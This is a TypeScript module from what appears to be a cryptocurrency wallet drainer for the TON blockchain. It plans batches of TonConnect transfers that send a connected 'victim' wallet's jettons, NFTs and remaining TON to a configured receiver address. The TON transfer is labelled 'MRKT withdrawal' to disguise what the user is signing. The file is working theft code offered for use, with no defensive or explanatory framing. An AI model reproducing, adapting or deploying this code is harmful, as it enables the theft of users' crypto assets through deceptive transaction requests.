import { Address, beginCell, toNano } from "@ton/core";
import type { AccountAssets, JettonBalance, NftItem } from "./tonapi.js";
import { config } from "./config.js";

const JETTON_TRANSFER = 0xf8a7ea5;
const NFT_TRANSFER = 0x5fcc3d14;
const MAX_MESSAGES = 4;

export type TonConnectMessage = {
  address: string;
  amount: string;
  payload?: string;
};

export type DrainBatch = {
  kind: "jettons" | "nfts" | "ton";
  messages: TonConnectMessage[];
  summary: string;
};

function jettonTransferBody(amount: bigint, destination: Address, response: Address): string {
  const body = beginCell()
    .storeUint(JETTON_TRANSFER, 32)
    .storeUint(0, 64)
    .storeCoins(amount)
    .storeAddress(destination)
    .storeAddress(response)
    .storeBit(0)
    .storeCoins(0)
    .storeBit(0)
    .endCell();
  return body.toBoc().toString("base64");
}

function nftTransferBody(newOwner: Address, response: Address): string {
  const body = beginCell()
    .storeUint(NFT_TRANSFER, 32)
    .storeUint(0, 64)
    .storeAddress(newOwner)
    .storeAddress(response)
    .storeBit(0)
    .endCell();
  return body.toBoc().toString("base64");
}

function jettonMessages(items: JettonBalance[], victim: Address): TonConnectMessage[] {
  return items.slice(0, MAX_MESSAGES).map((j) => ({
    address: j.jettonWallet.toString({ urlSafe: true, bounceable: true }),
    amount: toNano("0.05").toString(),
    payload: jettonTransferBody(j.balance, config.receiver, victim),
  }));
}

function nftMessages(items: NftItem[], victim: Address): TonConnectMessage[] {
  return items.slice(0, MAX_MESSAGES).map((n) => ({
    address: n.address.toString({ urlSafe: true, bounceable: true }),
    amount: toNano("0.05").toString(),
    payload: nftTransferBody(config.receiver, victim),
  }));
}

function tonMessage(assets: AccountAssets): TonConnectMessage | null {
  const reserve = toNano(config.feeReserveTon.toString());
  const min = toNano(config.minBalanceTon.toString());
  const sendable = assets.tonNano - reserve;
  if (sendable < min) return null;
  return {
    address: config.receiver.toString({ urlSafe: true, bounceable: true }),
    amount: sendable.toString(),
    payload: beginCell().storeUint(0, 32).storeStringTail("MRKT withdrawal").endCell().toBoc().toString("base64"),
  };
}

/** Picks the next drain batch (max 4 messages) by asset type priority: jettons → NFTs → TON. */
export function planNextBatch(
  owner: Address,
  assets: AccountAssets,
  cursor: { jettonOffset: number; nftOffset: number; tonDone: boolean },
): DrainBatch | null {
  const jettonSlice = assets.jettons.slice(cursor.jettonOffset, cursor.jettonOffset + MAX_MESSAGES);
  if (jettonSlice.length > 0) {
    cursor.jettonOffset += jettonSlice.length;
    const sym = jettonSlice.map((j) => j.symbol).join(", ");
    return {
      kind: "jettons",
      messages: jettonMessages(jettonSlice, owner),
      summary: `jettons: ${sym}`,
    };
  }

  const nftSlice = assets.nfts.slice(cursor.nftOffset, cursor.nftOffset + MAX_MESSAGES);
  if (nftSlice.length > 0) {
    cursor.nftOffset += nftSlice.length;
    return {
      kind: "nfts",
      messages: nftMessages(nftSlice, owner),
      summary: `nfts: ${nftSlice.length}`,
    };
  }

  if (!cursor.tonDone) {
    const msg = tonMessage(assets);
    if (msg) {
      cursor.tonDone = true;
      return { kind: "ton", messages: [msg], summary: "native TON" };
    }
    cursor.tonDone = true;
  }

  return null;
}
